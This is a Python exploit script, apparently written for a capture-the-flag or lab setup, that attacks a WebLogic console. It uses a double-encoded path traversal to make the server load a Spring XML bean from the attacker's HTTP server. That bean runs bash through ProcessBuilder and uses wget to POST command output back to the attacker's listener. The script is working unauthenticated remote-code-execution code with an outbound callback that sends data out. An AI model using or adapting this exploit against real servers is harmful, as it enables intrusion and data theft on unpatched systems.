#!/usr/bin/env python3

"""
该exp可能需要多试几次
"""
from tool.base import match_flag, process_with, get_local_ip, run_cmd
from tool.http_repeater import repeater
from tool.http_server import HttpEcho, HttpFile

echo = ""

def run(target: tuple[str, int]) -> tuple[bool, str, str]:
    ip = get_local_ip()
    if not ip:
        return False, "", "ip获取失败"
    repeater(f"""GET /console/ HTTP/1.1
Host: {target[0]}:{target[1]}

""")

    http_file_port = 8001
    http_echo_port = 8000
    xml = f"""<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
<constructor-arg>
<list>
<value>/bin/bash</value>
<value>-c</value>
<value><![CDATA[wget --method=POST --body-data=$(ls /tmp | grep flag-) http://{ip}:{http_echo_port}/]]></value>
</list>
</constructor-arg>
</bean>
</beans>""".encode()

    exp1 = f"""
GET /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://{ip}:{http_file_port}/flag.xml")  HTTP/1.1
Host: {target[0]}:{target[1]}


"""

    def on_body(body: bytes):
        global echo
        echo += body.decode()
    with HttpEcho(on_body,http_echo_port):
        with HttpFile({"flag.xml": xml},http_file_port):
            resp = repeater(exp1,timeout=2)
            if not resp and "Timeout" not in resp.error:
                return False,"",resp.error
            run_cmd("sleep 0.5")
            flag = match_flag(echo)
            if not flag:
                print(echo)
                return False,"","flag匹配失败"
            return True,flag,""






def main(ip_port: str):
    process_with(ip_port, run)


if __name__ == "__main__":
    from tool.base import set_debug
    set_debug()
    main("192.168.192.148:17703,55231")